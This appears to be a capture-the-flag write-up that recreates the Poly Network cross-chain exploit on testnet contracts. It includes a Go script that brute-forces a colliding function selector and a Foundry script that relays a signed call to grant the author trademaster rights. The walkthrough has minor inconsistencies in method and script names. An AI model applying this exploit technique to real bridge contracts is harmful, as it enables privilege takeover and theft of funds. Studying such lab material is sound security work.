# POLY NETWORK - REKT
Based on the 2021 Poly Network hack from the [Rekt Leaderboard](https://rekt.news/leaderboard/). 

## Overview

Poly is a cross-chain protocol allowing users to trigger cross-chain transactions/messaging.

From rekt.news:
> Poly has a contract called the "EthCrossChainManager". It's a privileged contract that has the right to trigger messages from another chain. It's a standard thing for cross-chain projects.
> It has a function named verifyHeaderAndExecuteTx that anyone can call to execute a cross-chain transaction.
> It (1) verifies that the block header is correct by checking signatures (seems the other chain was a poa sidechain or) and then (2) checks that the transaction was included within that block with a Merkle proof.
> One of the last things the function does is call executeCrossChainTx, which makes the call to the target contract. This is where the critical flaw sits. Poly checks that the target is a contract, but they forgot to prevent users from calling a very important target... the "EthCrossChainData" contract

In this repository, [`TradingBoat.sol`](contracts/TradingBoat.sol) is simulating `EthCrossChainManager` and [`TradingData.sol`] is simulating `EthCrossChainData`. 

The goal is to exploit `TradingBoat.sol` and be able to call `setTrademasters(address[])`.

## Deployments 
| Network       | Contract        | Address      |
| ------| ------|-----|
| Fuji  	| TradingBoat  	| [0x423e0D8466B6a962286C718E92b751B87b65a48c](https://testnet.avascan.info/blockchain/c/address/0x423e0D8466B6a962286C718E92b751B87b65a48c)	| 
| Sepolia   | TradingBoat  	| [0x871A6C16D8BC5ECA345c697b4aA1CDe4BF95341e](https://sepolia.etherscan.io/address/0x871A6C16D8BC5ECA345c697b4aA1CDe4BF95341e)	| 

## Walkthrough
We have two TradingBoats deployed, one on Sepolia and the other on Avalanche Fuji.

The objective is to make make the TradingBoat on Sepolia call the `setTrademasters(address[])` function from TradingData since it is the owner. The below function allow us to do this:
```solidity
   function relayShipment(
        string calldata _method, 
        bytes32[] calldata _args,
        uint64 _fromChainId,
        address _fromContract,
        address _toContract,
        bytes calldata _signature
    ) external {
        
        address fromTradingBoat = tradingData.tradingBoatByChainId(_fromChainId);
        CrossChainCall memory crossChainCall = CrossChainCall({
            fromChainId: _fromChainId,
            fromContract: _fromContract,
            toChainId: THIS_CHAIN_ID,
            toContract: _toContract,
            method: _method,
            args: _args
        });

        // (1) Verify that signature belongs to a trademaster
        address signer = _bridgeHash(crossChainCall, fromTradingBoat)
            .toEthSignedMessageHash()
            .recover(_signature);
                
        require(
            tradingData.isTrademaster(signer),
            "ERROR: INVALID CROSS-CHAIN SIGNATURE"
        );

        // (2) Call destination contract
        bytes memory functionSig = abi.encodePacked(_method, "(bytes32[],uint64,address)");
        bytes4 selector = bytes4(keccak256(functionSig));

        (bool success, ) = _toContract.call(
            abi.encodeWithSelector(selector, _args, _fromChainId, _fromContract)
        );

        require(success, "ERROR: SHIPMENT TO CLIENT FAILED");
    }
```

We need to find a `_method` so that `keccak256(abi.encodePacked(_method, "(bytes32[],uint64,address)"))` first 4 bytes result into `setTrademasters(address[])` selector: `0xef51774d`.

I've written the [find.go](find.go) script to do the job:
```go
package main

import (
	"bytes"
	"fmt"
	"strconv"
	"encoding/hex"
    "golang.org/x/crypto/sha3"
)

func main() {
	target, _ := hex.DecodeString("ef51774d")
	
	for result := 0 ; ; result++ {
		i := []byte(strconv.Itoa(result))

		hash := sha3.NewLegacyKeccak256()
		hash.Write([]byte("attack"))
		hash.Write(i)
		hash.Write([]byte("(bytes32[],uint64,address)"))
		buf := hash.Sum([]byte{})

		if bytes.Compare(buf[0:4], target) == 0 {
			fmt.Printf("%x found with : attack%d(bytes32[],uint64,address)\n", buf, result )
			println("IDX=", result)
			return
		}

		if result > 0 && result%1000000 == 0 {
			println("IDX=", result)
		}
	}
}
```

After few minutes, it returns `attack1908084701(bytes32[],uint64,address)`. We can run [`SendShipment.s.sol`](scripts/SendShipment.s.sol) using `attack190808470` as _method parameter with `forge script scripts/TradingBoat.s.sol --rpc-url fuji -vvv --broadcast` on Fuji.

It returns `0xe563231067eff803d7b67ce328b77866b29f3dfa7e0967f0cae1839c0e3ecc37̀`. 

We give this to the TradeMaster that will search for the matching cross-chain event on Fuji, and return the required signature:
```
Signature: 0xdfcb71ad5b91bbcb5818aab6c9319c7e025b331bcb1f54bd1082253e29601f3571a06c46d4ca69e33604c6dff656f23eeda01932398ff6f4a50bbc9bcc3041671b
```

Then, we can use this signature to run [`RelayShipment.s.sol`](scripts/RelayShipment.s.sol):
```solidity
// forge script scripts/RelayShipment.s.sol --rpc-url sepolia --broadcast 
contract RelayShipmentScript is Script {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public  {
        vm.startBroadcast(deployerPrivateKey);
        TradingBoat tradingBoat = TradingBoat(0x871A6C16D8BC5ECA345c697b4aA1CDe4BF95341e);

        uint64 _chainId;
        string memory _method = "attack1908084701";
        bytes32[] memory _args = new bytes32[](1);
        _args[0] = bytes32(uint256(uint160(0x26d403E1E1A1239d8b6f5907dE272CF311104753))); // address to input in setTrademasters(address[])
        uint64 _fromChainId = 43113; //fuji
        uint64 _toChainId = 11155111; //sepolia
        address _fromContract = 0x26d403E1E1A1239d8b6f5907dE272CF311104753; // fuji msg.sender
        address _toContract = 0x39eEddbBD4D133c3fcb0fD7B971f807Fc3552569; // sepolia TradingData

        bytes memory _signature = hex"dfcb71ad5b91bbcb5818aab6c9319c7e025b331bcb1f54bd1082253e29601f3571a06c46d4ca69e33604c6dff656f23eeda01932398ff6f4a50bbc9bcc3041671b";
        tradingBoat.relayShipment(_method, _args, _fromChainId, _fromContract, _toContract, _signature);
        vm.stopBroadcast();
    }
}
```

Now, our address 0x26d403E1E1A1239d8b6f5907dE272CF311104753 is a TradeMaster aswell.